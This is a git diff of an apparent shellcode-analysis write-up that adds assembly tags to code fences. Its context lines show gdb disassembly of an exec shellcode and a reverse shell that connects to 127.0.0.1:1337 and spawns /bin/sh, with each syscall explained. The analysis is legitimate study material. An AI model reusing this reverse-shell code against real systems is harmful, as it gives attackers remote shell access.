@@ -251,7 +251,7 @@ unsigned char buf[] =
 "\x2e\x74\x78\x74\x00\x57\x53\x89\xe1\xcd\x80";
 ```
 In the fist shellcode I used ndiasm already so I will jump direclty in gdb and the ndiasm output is anyway in github with the compiled c file. The shellcode instructions for this shellcode in gdb are the following:
-```
+``` assembly
 0x0804c040 <+0>:	push   0xb
 0x0804c042 <+2>:	pop    eax
 0x0804c043 <+3>:	cdq    
@@ -280,7 +280,7 @@ In the fist shellcode I used ndiasm already so I will jump direclty in gdb and t
 ```
 
 First let me explain what happens in this first block:
-```
+``` assembly
 0x0804c040 <+0>:	push   0xb
 0x0804c042 <+2>:	pop    eax
 0x0804c043 <+3>:	cdq    
@@ -302,7 +302,7 @@ Then we clear the flags and push a zero to the stack. After that we push 0x632d 
 
 ![exec1](images/exec/exec1.png)
 
-```
+``` assembly
 0x0804c072 <+50>:	push   edi
 0x0804c073 <+51>:	push   ebx
 0x0804c074 <+52>:	mov    ecx,esp
@@ -335,7 +335,7 @@ unsigned char buf[] =
 ```
 
 We will jump direclty in the GDB disassembly which is the following:
-```
+``` assembly
 0x0804c040 <+0>:	xor    ebx,ebx
 0x0804c042 <+2>:	mul    ebx
 0x0804c044 <+4>:	push   ebx
@@ -375,7 +375,7 @@ We will jump direclty in the GDB disassembly which is the following:
 I will divide it in the blocks of each syscall. I will not go so in detail of the functions and arguments because that I already did in the second assignment.
 
 ### socketcall - socket
-```
+``` assembly
 0x0804c040 <+0>:	xor    ebx,ebx
 0x0804c042 <+2>:	mul    ebx
 0x0804c044 <+4>:	push   ebx
@@ -391,7 +391,7 @@ First ebx and eax is set to zero and zero is pushed to the stack. Ebx will then 
 ![socketcall-socket](images/revshell/socketcall-socket.png)
 
 ### dup2  
-```
+``` assembly
 0x0804c04f <+15>:	xchg   ebx,eax
 0x0804c050 <+16>:	pop    ecx
 0x0804c051 <+17>:	mov    al,0x3f
@@ -404,7 +404,7 @@ Here we see that ebx and eax change registers and the 0x2 is poped from the stac
 ![dup2](images/revshell/dup2.png)
 
 ### socketcall - connect
-```
+``` assembly
 0x0804c058 <+24>:	push   0x100007f
 0x0804c05d <+29>:	push   0x39050002
 0x0804c062 <+34>:	mov    ecx,esp
@@ -421,7 +421,7 @@ First there are two pushes executed. First we see the adress to connect to which
 ![connect](images/revshell/connect.png)
 
 ### execve
-```
+``` assembly
 0x0804c06f <+47>:	push   edx
 0x0804c070 <+48>:	push   0x68732f6e
 0x0804c075 <+53>:	push   0x69622f2f
